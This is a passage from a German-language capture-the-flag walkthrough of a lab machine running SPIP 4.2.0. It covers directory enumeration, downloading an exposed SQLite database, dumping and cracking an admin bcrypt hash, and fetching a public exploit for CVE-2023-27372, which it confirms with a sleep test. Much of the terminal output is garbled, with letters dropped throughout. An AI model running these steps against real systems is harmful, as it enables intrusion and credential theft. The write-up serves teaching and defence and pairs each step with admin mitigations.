+                <br><strong>Empfehlung (Pentester):</strong> Identifiziere die Login-Seite eines gefundenen CMS. Halte Ausschau nach Benutzername-Enumerate-Funktionen oder Anzeichen von Brute-Force-Schutz. Verwende gefundene Anmeldedaten (z.B. aus Datenbanken) hier.
+                <br><strong>Empfehlung (Admin):</strong> Schützen Sie Ihre Login-Seiten durch Ratenbegrenzung oder CAPTCHA, um Brute-Force-Angriffe zu verhindern. Überwachen Sie Login-Versuche auf ungewöhnliche Muster.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">htt://ulisher.hmv/si/si.h?age=lgin&url=/si/ecrire/inex.h&lang=e</div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">Lgin-I er E-Mail: *</span>
+<span class="command">asswrt: *</span>
+
+asswrt vergessen?
+An mich erinnern
+
+Zrck zr ffentlichen Website
+</pre>
+                </div>
+            </div>
+             <p class="comment">
+                <strong>Analyse:</strong> Ich verwende `feroxbuster`, ein Tool zur Verzeichnis- und Dateiaufzählung (Dirbusting), um versteckte Verzeichnisse und Dateien auf dem Webserver zu finden. Der Befehl zielt auf `http://publisher.hmv` ab (`--url`), verwendet eine umfangreiche Wortliste (`--wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt`) und prüft auf eine Vielzahl von Dateierweiterungen (`-x`). Ich filtere die Ergebnisse, um nur Weiterleitungen (Statuscodes 301 und 302) anzuzeigen (`-s 301 302`). Der Scan findet zahlreiche Weiterleitungen, die auf die Existenz verschiedener SPIP-Verzeichnisse hinweisen (`/images`, `/spip`, `/spip/local`, `/spip/vendor`, `/spip/config`, `/spip/tmp`, `/spip/IMG`, `/spip/ecrire` und viele Unterverzeichnisse von `ecrire`). Die 302-Weiterleitung für `/spip/ecrire/index.php` bestätigt, dass der Admin-Bereich zur Login-Seite weiterleitet, wenn man nicht authentifiziert ist.
+                <br><strong>Bewertung:</strong> Feroxbuster bestätigt die Struktur des SPIP-Systems und die Existenz vieler Standardverzeichnisse. Die Weiterleitungen zu Verzeichnissen zeigen, dass diese existieren. Dies ergänzt die Erkenntnisse aus der manuellen Erkundung und Nikto und gibt einen umfassenderen Überblick über die Webanwendung.
+                <br><strong>Empfehlung (Pentester):</strong> Nutze Dirbusting-Tools wie Feroxbuster oder Gobuster, um versteckte Verzeichnisse und Dateien zu finden. Passe Wortlisten und Dateierweiterungen an das Ziel an. Achte auf verschiedene HTTP-Statuscodes (200 OK, 301/302 Redirects, 403 Forbidden etc.), da sie unterschiedliche Bedeutungen haben.
+                <br><strong>Empfehlung (Admin):</strong> Bereinigen Sie Standard-Installationsverzeichnisse und entfernen Sie alle nicht benötigten Dateien. Konfigurieren Sie den Webserver so, dass Anfragen an nicht existierende Ressourcen einen 404-Fehler zurückgeben, anstatt auf existierende (aber leere oder gesperrte) Verzeichnisse weiterzuleiten, um die Enumeration zu erschweren.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">ferxuster --url "htt://ulisher.hmv" --wrdlist /usr/share/wrdlists/seclists/iscvery/We-Cntent/irectry-list-2.3-mei.txt -x .git,.h,.html,.xml,.zi.7z,.tar,.ak,.sl,.y,.l,.txt,.j.je.ng,.js,.aac,.gg,.flac,.alac,.wav,.aiff,.dsd,.m3,.m4,.mk.html -s 301 302</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+y en "ei" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ htt://ulisher.hmv
+ 🚀  Threas               │ 50
+ 📖  Wrdlist              │ /usr/share/wrdlists/seclists/iscvery/We-Cntent/irectry-list-2.3-mei.txt
+ 👌  Status Cdes          │ <span class="command">[301, 302]</span>
+ 💥  Timeut (secs)        │ 7
+ 🦡  User-Agent            │ ferxuster/2.11.0
+ 💉  Cnfig File           │ /etc/ferxuster/ferx-cnfig.tml
+ 🔎  Extract Links         │ tre
+ 💲  Extensions            │ [git, h, html, xml, zi, 7z, tar, ak, sl, y, l, txt, j, je, ng, js, aac, gg, flac, alac, wav, aiff, dsd, m3, m4, mk, html]
+ 🏁  HTTP methds          │ [GET]
+ 🔃  Recursin Deh       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  ress [ENTER] t use the Scan Management Men™
+──────────────────────────────────────────────────
+<span class="command">301      GET        9l       28w      315c htt://ulisher.hmv/images => htt://ulisher.hmv/images/</span>
+<span class="command">301      GET        9l       28w      313c htt://ulisher.hmv/si => htt://ulisher.hmv/si/</span>
+<span class="command">301      GET        9l       28w      319c htt://ulisher.hmv/si/lcal => htt://ulisher.hmv/si/lcal/</span>
+<span class="command">301      GET        9l       28w      320c htt://ulisher.hmv/si/vendr => htt://ulisher.hmv/si/vendr/</span>
+<span class="command">301      GET        9l       28w      320c htt://ulisher.hmv/si/cnfig => htt://ulisher.hmv/si/cnfig/</span>
+<span class="command">301      GET        9l       28w      317c htt://ulisher.hmv/si/tm => htt://ulisher.hmv/si/tm/</span>
+<span class="command">301      GET        9l       28w      317c htt://ulisher.hmv/si/IMG => htt://ulisher.hmv/si/IMG/</span>
+<span class="command">301      GET        9l       28w      320c htt://ulisher.hmv/si/ecrire => htt://ulisher.hmv/si/ecrire/</span>
+<span class="command">302      GET       10l       34w      449c htt://ulisher.hmv/si/ecrire/inex.h => htt://ulisher.hmv/si/si.h?age=lgin&url=%2Fsi%2Fecrire%2Finex.h</span>
+<span class="command">301      GET        9l       28w      324c htt://ulisher.hmv/si/ecrire/xml => htt://ulisher.hmv/si/ecrire/xml/</span>
+<span class="command">301      GET        9l       28w      327c htt://ulisher.hmv/si/ecrire/uic => htt://ulisher.hmv/si/ecrire/uic/</span>
+<span class="command">301      GET        9l       28w      328c htt://ulisher.hmv/si/ecrire/lugins => htt://ulisher.hmv/si/ecrire/lugins/</span>
+<span class="command">301      GET        9l       28w      327c htt://ulisher.hmv/si/ecrire/actin => htt://ulisher.hmv/si/ecrire/actin/</span>
+<span class="command">301      GET        9l       28w      328c htt://ulisher.hmv/si/ecrire/install => htt://ulisher.hmv/si/ecrire/install/</span>
+<span class="command">301      GET        9l       28w      324c htt://ulisher.hmv/si/ecrire/src => htt://ulisher.hmv/si/ecrire/src/</span>
+<span class="command">301      GET        9l       28w      325c htt://ulisher.hmv/si/ecrire/lang => htt://ulisher.hmv/si/ecrire/lang/</span>
+<span class="command">301      GET        9l       28w      325c htt://ulisher.hmv/si/ecrire/exec => htt://ulisher.hmv/si/ecrire/exec/</span>
+<span class="command">301      GET        9l       28w      325c htt://ulisher.hmv/si/ecrire/ase => htt://ulisher.hmv/si/ecrire/ase/</span>
+<span class="command">301      GET        9l       28w      324c htt://ulisher.hmv/si/ecrire/inc => htt://ulisher.hmv/si/ecrire/inc/</span>
+<span class="command">301      GET        9l       28w      325c htt://ulisher.hmv/si/ecrire/ath => htt://ulisher.hmv/si/ecrire/ath/</span>
+<span class="command">301      GET        9l       28w      334c htt://ulisher.hmv/si/ecrire/ntifictins => htt://ulisher.hmv/si/ecrire/ntifictins/</span>
+<span class="command">301      GET        9l       28w      325c htt://ulisher.hmv/si/ecrire/rls => htt://ulisher.hmv/si/ecrire/rls/</span>
+[#>------------------] - 7m   6186924/74119752 74m     fnd:22      errrs:591
+🚨 Caught ctrl+c 🚨 saving scan state t ferx-htt_ulisher_hmv-1749677117.state ...
+[#>------------------] - 7m   6187584/74119752 74m     fnd:22      errrs:591
+[####>---------------] - 7m   1317792/6175316 3221/s  htt://ulisher.hmv/
+[####################] - 0s   6175316/6175316 411687733/s htt://ulisher.hmv/images/ => irectry listing (add --scan-ir-listings t scan)
+[###>----------------] - 7m   1092112/6175316 2775/s  htt://ulisher.hmv/si/
+[####################] - 0s   6175316/6175316 343073111/s htt://ulisher.hmv/si/lcal/ => irectry listing (add --scan-ir-listings t scan)
+[####################] - 1s   6175316/6175316 10008616/s htt://ulisher.hmv/si/lcal/cache-css/ => irectry listing (add --scan-ir-listings t scan)
+[####################] - 0s   6175316/6175316 47139817/s htt://ulisher.hmv/si/lcal/cache-js/ => irectry listing (add --scan-ir-listings t scan)
+[####################] - 0s   6175316/6175316 294062667/s htt://ulisher.hmv/si/lcal/cache-vignettes/ => irectry listing (add --scan-ir-listings t scan)
+[####################] - 0s   6175316/6175316 411687733/s htt://ulisher.hmv/si/vendr/ => irectry listing (add --scan-ir-listings t scan)
+[####################] - 0s   6175316/6175316 247012640/s htt://ulisher.hmv/si/vendr/cmser/ => irectry listing (add --scan-ir-listings t scan)
+[####################] - 0s   6175316/6175316 308765800/s htt://ulisher.hmv/si/vendr/jakeasith/ => irectry listing (add --scan-ir-listings t scan)
+[####################] - 0s   6175316/6175316 308765800/s htt://ulisher.hmv/si/vendr/symny/ => irectry listing (add --scan-ir-listings t scan)
+[####################] - 0s   6175316/6175316 325016632/s htt://ulisher.hmv/si/vendr/alg26-atthias/ => irectry listing (add --scan-ir-listings t scan)
+[####################] - 0s   6175316/6175316 294062667/s htt://ulisher.hmv/si/cnfig/ => irectry listing (add --scan-ir-listings t scan)
+[####################] - 0s   6175316/6175316 114357704/s htt://ulisher.hmv/si/cnfig/ases/ => irectry listing (add --scan-ir-listings t scan)
+[####################] - 0s   6175316/6175316 220547000/s htt://ulisher.hmv/si/tm/ => irectry listing (add --scan-ir-listings t scan)
+[####################] - 0s   6175316/6175316 55136750/s htt://ulisher.hmv/si/tm/sessins/ => irectry listing (add --scan-ir-listings t scan)
+[####################] - 0s   6175316/6175316 363253882/s htt://ulisher.hmv/si/tm/ulad/ => irectry listing (add --scan-ir-listings t scan)
+[####################] - 0s   6175316/6175316 30123493/s htt://ulisher.hmv/si/tm/lg/ => irectry listing (add --scan-ir-listings t scan)
+[####################] - 0s   6175316/6175316 212941931/s htt://ulisher.hmv/si/tm/cache/ => irectry listing (add --scan-ir-listings t scan)
+[####################] - 0s   6175316/6175316 385957250/s htt://ulisher.hmv/si/IMG/ => irectry listing (add --scan-ir-listings t scan)
+[####################] - 0s   6175316/6175316 158341436/s htt://ulisher.hmv/si/IMG/j/ => irectry listing (add --scan-ir-listings t scan)
+[#>------------------] - 5m    448000/6175316 1435/s  htt://ulisher.hmv/si/ecrire/
+[#>------------------] - 5m    444920/6175316 1429/s  htt://ulisher.hmv/si/ecrire/xml/
+[#>------------------] - 5m    439460/6175316 1414/s  htt://ulisher.hmv/si/ecrire/uic/
+[####################] - 0s   6175316/6175316 325016632/s htt://ulisher.hmv/si/ecrire/lugins/ => irectry listing (add --scan-ir-listings t scan)
+[#>------------------] - 5m    432012/6175316 1407/s  htt://ulisher.hmv/si/ecrire/actin/
+[#>------------------] - 5m    423304/6175316 1379/s  htt://ulisher.hmv/si/ecrire/install/
+[####################] - 1s   6175316/6175316 5498946/s htt://ulisher.hmv/si/ecrire/src/ => irectry listing (add --scan-ir-listings t scan)
+[#>------------------] - 5m    413280/6175316 1373/s  htt://ulisher.hmv/si/ecrire/lang/
+[#>------------------] - 5m    402332/6175316 1353/s  htt://ulisher.hmv/si/ecrire/exec/
+[#>------------------] - 5m    382564/6175316 1321/s  htt://ulisher.hmv/si/ecrire/ase/
+[#>------------------] - 5m    380744/6175316 1332/s  htt://ulisher.hmv/si/ecrire/inc/
+[####################] - 0s   6175316/6175316 411687733/s htt://ulisher.hmv/si/ecrire/ath/ => irectry listing (add --scan-ir-listings t scan)
+[####################] - 3s   6175316/6175316 2234195/s htt://ulisher.hmv/si/ecrire/ntifictins/ => irectry listing (add --scan-ir-listings t scan)
+[>-------------------] - 19s     8204/6175316 432/s   htt://ulisher.hmv/si/ecrire/rls/
+[--------------------] - 0s         0/6175316 -       htt://ulisher.hmv/images/180_clmn_g.j
+[--------------------] - 0s         0/6175316 -       htt://ulisher.hmv/images/as.j
+[--------------------] - 0s         0/6175316 -       htt://ulisher.hmv/images/cmment_icn.j
+[--------------------] - 0s         0/6175316 -       htt://ulisher.hmv/images/temelatme_clmn_tw_g.j
+[--------------------] - 0s         0/6175316 -       htt://ulisher.hmv/images/men_g_reeat.j
+[--------------------] - 0s         0/6175316 -       htt://ulisher.hmv/images/image_01.j
+[--------------------] - 0s         0/6175316 -       htt://ulisher.hmv/images/men_g.j
+[--------------------] - 0s         0/6175316 -       htt://ulisher.hmv/images/ttm_anel_g.j
+[--------------------] - 0s         0/6175316 -       htt://ulisher.hmv/images/lg.j
+[--------------------] - 0s         0/6175316 -       htt://ulisher.hmv/style.css
+[--------------------] - 0s         0/6175316 -       htt://ulisher.hmv/text/
+</pre>
+                </div>
+            </div>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Eine der wichtigsten Entdeckungen während der Web-Enumeration war die öffentlich zugängliche Datei `/spip/config/bases/spip.sqlite` aufgrund der aktivierten Verzeichnisauflistung. Diese Datei ist die SQLite-Datenbank des SPIP-CMS. Ich navigiere zu meinem Downloads-Verzeichnis auf meinem Angreifersystem und öffne die heruntergeladene `spip.sqlite`-Datei mit dem `sqlite3`-Befehlszeilen-Tool. Mit `.tables` lasse ich mir alle Tabellen in der Datenbank anzeigen. Die Ausgabe zeigt eine Reihe von Tabellen, darunter `spip_auteurs`, was die Tabelle der CMS-Benutzer sein sollte. Um die Daten dieser Tabelle zu sehen, aktiviere ich `.headers on`, damit die Spaltennamen angezeigt werden, und führe dann `SELECT * FROM spip_auteurs;` aus. Diese Abfrage ist erfolgreich und liefert die Daten des Benutzers mit `id_auteur 1`, `nom` "think", `login` "admin", `email` "think@gmail.com" und einem Wert in der Spalte `pass`: `$2y$10$Mh4g9QACK10dLICh6ukktuSjVBDXvFZjHH/cwRww9RY0JVNWxgAxK`. Dieser Wert sieht eindeutig nach einem gehashten Passwort aus, genauer gesagt nach einem bcrypt-Hash (erkennbar am `$2y$`).
+                <br><strong>Bewertung:</strong> Der Zugriff auf die SPIP-Datenbank und das Auslesen der `spip_auteurs`-Tabelle ist ein kritischer Erfolg! Ich habe den Benutzernamen (`admin`), die Login-ID (`admin`) und den gehashten Passwort für den Administrator des CMS (`think@gmail.com`) erlangt. Ein öffentlich zugängliches Datenbank-File ist eine schwerwiegende Schwachstelle. Der bcrypt-Hash ist zwar gesalzen, kann aber offline mit Tools wie John the Ripper oder Hashcat gebrute-forced werden, wenn die Komplexität des Passworts gering ist.
+                <br><strong>Empfehlung (Pentester):</strong> Lade sofort jede öffentlich zugängliche Datenbankdatei herunter. Analysiere den Inhalt nach Benutzerkonten, gehashten Passwörtern, API-Schlüsseln oder anderen sensiblen Daten. Versuche, die gefundenen Passwörter offline zu knacken.
+                <br><strong>Empfehlung (Admin):</strong> Speichern Sie Datenbankdateien und Backups niemals im öffentlich zugänglichen Web-Root. Deaktivieren Sie Verzeichnisauflistungen auf Ihrem Webserver. Schützen Sie Ihre Datenbanken mit starken, eindeutigen Passwörtern. Überprüfen Sie die Konfiguration Ihres CMS, um sicherzustellen, dass sensible Dateien korrekt geschützt sind.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[/hme/ccat/wnlas]
+└─# <span class="command">sqlite3 si.sqlite</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+SQLite versin 3.46.1 2024-08-13 09:16:08
+Enter ".hel" fr sage hints.
+sqlite> .tales
+<span class="command">si_articles            si_js_liens          si_synic</span>
+<span class="command">si_ateurs             si_meta                si_synic_articles</span>
+<span class="command">si_ateurs_liens       si_mts                si_tyes_dcments</span>
+<span class="command">si_ets              si_mts_liens          si_rls</span>
+<span class="command">si_ets_lugins      si_aets             si_versins</span>
+<span class="command">si_cmments           si_lugins             si_versins_fragnets</span>
+<span class="command">si_cmments_liens     si_refers            si_visites</span>
+<span class="command">si_frm               si_refers_articles   si_visites_articles</span>
+<span class="command">si_grs_mts        si_reslts</span>
+<span class="command">si_js                si_rriques</span>
+sqlite>
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">sqlite> .heers n</div>
+                </div>
+                <div class="terminal">
+                    <pre>
+sqlite> SELECT * FRM si_ateurs;
+<span class="command">i_ater|nm|i|email|nm_site|rl_site|lgin|ass|lw_sec|statut|wemestre|aj|g|htass|en_ligne|alea_actel|alea_ftr|refs|ckie_uli|srce|lang|iesage|acku_cles</span>
+<span class="command">1|think||think@gmail.cm|||<span class="password">amin</span>|<span class="password">$2y$10$Mh4g9QACK10dLICh6ukktuSjVBXvFjHH/cwRww9RY0JNWxgAxK</span>||0minirez|i|2023-11-14 09:09:01|||2023-11-14 09:09:01|146722431065524ece1a4a1.94441434|52612618565528f758c57c3.33260947|a:4:{s:7:"cle";i:2;s:7:"islay";i:2;s:18:"islay_navigatin";s:22:"navigatin_avec_icnes";s:3:"cnx";s:0:"";}||si|||MYu0Z6l8FM VrIW6QkiX5er1sgLTG+frAYQMoxIfh2wymLy/XSIrqy64lgaF5u0ScWCp4z2FwnuH6G7ttcMewVKMRZycJS+amx1aYkWAr8keUsmAPwaSQyaINyTjr38LFEQSJxLtWM5CIhaJULCJ/lEJOadENH mgMrWSqINLitwX7f99dCt/esQN+Tn0bbp8eCXuc1AfxxQQ8iruI3UTgR/UCT34REF6Ht0vKIVZD9sDj2SQk9fc=</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Nachdem ich den gehashten Passwort für den Benutzer `admin` (Login `admin`, Name `think`, Email `think@gmail.com`) aus der Datenbank extrahiert habe, versuche ich nun, diesen Hash (`$2y$10$Mh4g9QACK10dLICh6ukktuSjVBDXvFZjHH/cwRww9RY0JVNWxgAxK`) mit dem Passwort-Cracking-Tool John the Ripper zu knacken. Ich speichere den Hash in einer Datei namens `hash.txt` mit dem Befehl `echo '$2y$10$Mh4g9QACK10dLICh6ukktuSjVBDXvFZjHH/cwRww9RY0JVNWxgAxK' > hash.txt`. Dann starte ich John mit `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`, wobei ich die bekannte Wortliste `rockyou.txt` verwende. Die Ausgabe zeigt, dass John 1 Passwort-Hash vom Typ bcrypt lädt und mit dem Cracking beginnt.
+                <br><strong>Bewertung:</strong> Die Offline-Passwort-Brute-Force ist eine Standardtechnik, um Hashes aus kompromittierten Datenbanken nutzbar zu machen. Wenn das Passwort in einer gängigen Wortliste enthalten ist und der Hash-Algorithmus nicht extrem rechenintensiv ist, sind die Chancen gut, das Klartext-Passwort zu finden. Die Verwendung von bcrypt mit 10 Runden (was `$10$` im Hash anzeigt) bietet einen gewissen Schutz, aber ein schwaches Passwort aus einer Wortliste kann dennoch geknackt werden.
+                <br><strong>Empfehlung (Pentester):</strong> Versuche immer, gefundene Passwort-Hashes offline zu knacken. Nutze verschiedene Wortlisten und Cracking-Tools (John, Hashcat). Identifiziere den Hash-Typ korrekt, um das richtige Tool und die richtige Methode zu verwenden.
+                <br><strong>Empfehlung (Admin):</strong> Speichern Sie Passwörter niemals im Klartext. Verwenden Sie starke, moderne Hash-Algorithmen (wie bcrypt mit ausreichend vielen Runden, Argon2) mit Salt. Erzwingen Sie komplexe Passwörter, die nicht in gängigen Wortlisten enthalten sind, und implementieren Sie regelmäßige Passwortänderungen. Die beste Verteidigung ist jedoch, die Datenbankdatei gar nicht erst öffentlich zugänglich zu machen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[/hme/ccat/wnlas]
+└─# <span class="command">ech '$2y$10$Mh4g9QACK10dLICh6ukktuSjVBXvFjHH/cwRww9RY0JNWxgAxK' > hash.txt</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[/hme/ccat/wnlas]
+└─# <span class="command">jhn --wrdlist=/usr/share/wrdlists/rcky.txt hash.txt</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+Using efalt int encdig: UTF-8
+Lae 1 asswrd hash (crty [Blwfish 32/64 X3])
+Cst 1 (iteratin cnt) is 1024 fr all lae hashes
+Will run 12 PenM threas
+ress 'q' r Ctrl-C t art, almsta any ther key fr stats
+</pre>
+                </div>
+            </div>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Während John the Ripper versucht, den gehashten Admin-Passwort zu knacken, verfolge ich parallel einen anderen vielversprechenden Angriffsvektor: eine bekannte Remote Code Execution (RCE) Schwachstelle in der identifizierten SPIP-Version. Ich weiß, dass das System SPIP 4.2.0 verwendet. Eine schnelle Suche nach "CVE-2023-27372", der CVE-ID für eine unauthentifizierte RCE in SPIP 4.2.0, liefert Treffer. Ich suche auf GitHub nach Proof-of-Concept (PoC) Exploits für diese CVE. Der im Text erwähnte Exploit von `redboltsec` auf GitHub sieht vielversprechend aus. Dies ist mein "Plan B" für den initialen Zugriff, falls das Passwort-Cracking fehlschlägt oder zu lange dauert.
+                <br><strong>Bewertung:</strong> Das Wissen über die exakte CMS-Version ist ein entscheidender Vorteil, da es die gezielte Suche nach spezifischen, oft schwerwiegenden Schwachstellen ermöglicht. Eine unauthentifizierte RCE ist eine kritische Schwachstelle, die es mir erlauben würde, Befehle auf dem Zielsystem auszuführen, ohne mich authentifizieren zu müssen. Dies ist ein idealer Vektor für den initialen Zugriff.
+                <br><strong>Empfehlung (Pentester):</strong> Sobald du das verwendete CMS und dessen Version identifiziert hast, suche umgehend nach bekannten Schwachstellen (CVEs) und verfügbaren Exploits. Priorisiere unauthentifizierte RCE-, LFI- oder SQL Injection-Schwachstellen.
+                <br><strong>Empfehlung (Admin):</strong> Halten Sie Ihr CMS und alle Plugins immer auf dem neuesten Stand, um sich vor bekannten Schwachstellen zu schützen. Abonnieren Sie Sicherheitsmeldungen für die von Ihnen verwendete Software. Entfernen Sie veraltete oder ungenutzte Plugins.
+            </p>
+            <section id="proof-of-concept-rce">
+                 <h2>Proof of Concept: SPIP RCE (CVE-2023-27372)</h2>
+                 <p class="comment">
+                     <strong>Kurzbeschreibung:</strong> Dieser Abschnitt demonstriert die Ausnutzung der unauthentifizierten Remote Code Execution (RCE) Schwachstelle CVE-2023-27372 in SPIP Version 4.2.0, um die Ausführung beliebiger Befehle auf dem Zielsystem mit den Berechtigungen des Webservers (`www-data`) zu erlangen.
+                 </p>
+                 <p class="comment">
+                     <strong>Voraussetzungen:</strong>
+                     <ul>
+                         <li>Zugriff auf den SPIP-Webserver auf Port 80.</li>
+                         <li>Der Zielserver läuft eine verwundbare SPIP-Version (hier: 4.2.0).</li>
+                         <li>Ein Proof-of-Concept-Exploit-Skript für CVE-2023-27372 (z.B. von GitHub).</li>
+                     </ul>
+                 </p>
+                  <p class="comment">
+                     <strong>Schritt-für-Schritt-Anleitung:</strong>
+                     <br>1. Suche nach einem PoC-Exploit für CVE-2023-27372 (z.B. auf GitHub oder Exploit-DB).
+                     <br>2. Lade das Exploit-Skript auf dein Angreifersystem herunter.
+                     <br>3. Führe das Skript aus, um die RCE-Schwachstelle zu testen und einen Befehl auf dem Zielsystem auszuführen.
+                     <br>4. Nutze das Skript, um einen Reverse Shell-Befehl auf dem Zielsystem auszuführen, der eine Verbindung zu einem auf deinem Angreifersystem eingerichteten Netcat-Listener herstellt.
+                     <br>5. Empfange die Reverse Shell auf deinem Netcat-Listener, um interaktiven Zugriff auf das Zielsystem zu erlangen.
+                 </p>
+                 <!-- Hier wären Screenshots oder andere Beweismittel des POC, wenn sie im Text oder als Bilder bereitgestellt worden wären. Da die tatsächliche Ausnutzung erst im Initial Access gezeigt wird, ist dies hier eine konzeptionelle Beschreibung. -->
+                 <p class="comment">
+                     <strong>Erwartetes Ergebnis:</strong> Ausführung beliebiger Systembefehle mit den Berechtigungen des Webservers (typischerweise `www-data`) und Erlangung einer Reverse Shell.
+                 </p>
+                 <p class="comment">
+                     <strong>Risikobewertung:</strong> Kritisch. Eine unauthentifizierte RCE ist eine der schwerwiegendsten Schwachstellen, da sie einem Angreifer ohne jede Authentifizierung die Kontrolle über das System (mit den Berechtigungen des verwundbaren Dienstes) ermöglicht.
+                 </p>
+                 <p class="comment">
+                     <strong>Empfehlungen:</strong>
+                     <br><strong>Empfehlung (Admin):</strong> **Kritisch:** Aktualisieren Sie SPIP umgehend auf eine nicht verwundbare Version (>= 4.2.1). Stellen Sie sicher, dass alle SPIP-Plugins und Themes ebenfalls aktuell sind. Überwachen Sie Webserver-Logs auf Anzeichen von Exploitation-Versuchen, insbesondere ungewöhnliche Anfragen an SPIP-Skripte.
+                 </p>
+            </section>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Um den Exploit für CVE-2023-27372 zu nutzen, lade ich ihn zunächst von GitHub herunter. Ich wechsle in mein `Hackingtools`-Verzeichnis und verwende `git clone https://github.com/redboltsec/CVE-2023-27372-PoC.git spip-rce-exploit`, um das Repository in einem neuen Ordner namens `spip-rce-exploit` zu klonen. Anschließend wechsle ich in diesen Ordner (`cd spip-rce-exploit`) und liste den Inhalt mit `ll` auf, um die heruntergeladenen Dateien zu sehen. Ich sehe das Python-Exploit-Skript `cve-2023-27372.py`, eine `README.md` und eine `requirements.txt`. Alternativ könnte ich auch `searchsploit -m 51536` verwenden, um den Exploit von Exploit-DB zu kopieren, wie im zweiten Befehlsblock gezeigt. Die Ausgabe von `searchsploit` bestätigt, dass es sich um einen unauthentifizierten RCE-Exploit für SPIP v4.2.0 handelt.
+                <br><strong>Bewertung:</strong> Das erfolgreiche Herunterladen des Exploit-Skripts ist der notwendige Schritt, um die RCE-Schwachstelle auszunutzen. Die Verfügbarkeit eines öffentlichen und verifizierten Exploits auf Exploit-DB macht die Ausnutzung dieser Schwachstelle sehr einfach.
+                <br><strong>Empfehlung (Pentester):</strong> Verwalte deine Hacking-Tools und Exploits systematisch. Nutze `git clone` oder `searchsploit`, um Exploits auf dein System zu holen. Lies immer die `README.md` und `requirements.txt` des Exploits, um dessen Nutzung und Abhängigkeiten zu verstehen.
+                <br><strong>Empfehlung (Admin):</strong> Überwachen Sie Ihre Systeme auf ungewöhnlichen `git clone`-Traffic, insbesondere von bekannten Exploit-Repositorys. Dies ist zwar auf der Angreiferseite, aber das Wissen, wie Angreifer vorgehen, hilft bei der Verteidigung. Erkennen Sie, dass öffentliche Exploits die Bedrohung durch eine Schwachstelle exponentiell erhöhen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">c Hackingtls</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtls]
+└─# <span class="command">git clne htts://githu.cm/redltsec/CE-2023-27372-oC.git si-rce-exit</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+Klne nach 'si-rce-exit'...
+remte: Enumerating jets: 12, dne.
+remte: Cnting jets: <span class="command">100% (12/12)</span>, dne.
+remte: Cmressing jets: <span class="command">100% (9/9)</span>, dne.
+remte: Ttal 12 (delta 1), reüse 0 (delta 0), ack-reüse 0 (frm 0)
+Efangen jets: <span class="command">100% (12/12)</span>, <span class="command">4.96 Ki | 4.96 Mi/s</span>, fertig.
+Lse Unterscheie af: <span class="command">100% (1/1)</span>, fertig.
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtls]
+└─# <span class="command">c si-rce-exit</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtls/si-rce-exit]
+└─# <span class="command">ll</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">insgesamt 16</span>
+<span class="command">-rw-r--r-- 1 rt rt 4814 11. Jun 23:43 cve-2023-27372.y</span>
+<span class="command">-rw-r--r-- 1 rt rt 1766 11. Jun 23:43 REAE.m</span>
+<span class="command">-rw-r--r-- 1 rt rt   29 11. Jun 23:43 reqirements.txt</span>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtls/si-rce-exit]
+└─# <span class="command">searchslitt -m 51536</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+  Exit: SPIP v4.2.0 - Remte Cde Executin (Uathenticate)
+      URL: [Link: htts://www.exit-d.cm/exlits/51536 | Ziel: htts://www.exit-d.cm/exlits/51536]
+     ath: <span class="command">/usr/share/exitd/exlits//weaas/51536.y</span>
+    Cdes: <span class="command">CE-2023-27372</span>
+ Verifie: Tre
+File Tye: ythn scrit, ASCII text executa le
+Cie t: <span class="command">/rt/Hackingtls/si-rce-exit/51536.y</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="comment">
+                <strong>Analyse:</strong> Um die Funktionalität des heruntergeladenen RCE-Exploits zu testen, führe ich ihn mit einem einfachen und harmlosen Befehl aus. Ich verwende das Python-Skript (hier wahrscheinlich in `spk.py` umbenannt) mit der URL des SPIP-Servers (`-u http://publisher.hmv/spip`) und dem Befehl `sleep 5` (`-c 'sleep 5'`). Wenn der Exploit erfolgreich ist, sollte der Server diesen Befehl ausführen, was eine Verzögerung von 5 Sekunden verursacht. Die Ausgabe `real 5,25s` zeigt, dass die Ausführung des Skripts tatsächlich etwa 5,25 Sekunden gedauert hat. Dies ist starker Beweis dafür, dass der `sleep 5` Befehl auf dem Zielsystem ausgeführt wurde und die RCE-Schwachstelle ausnutzbar ist.
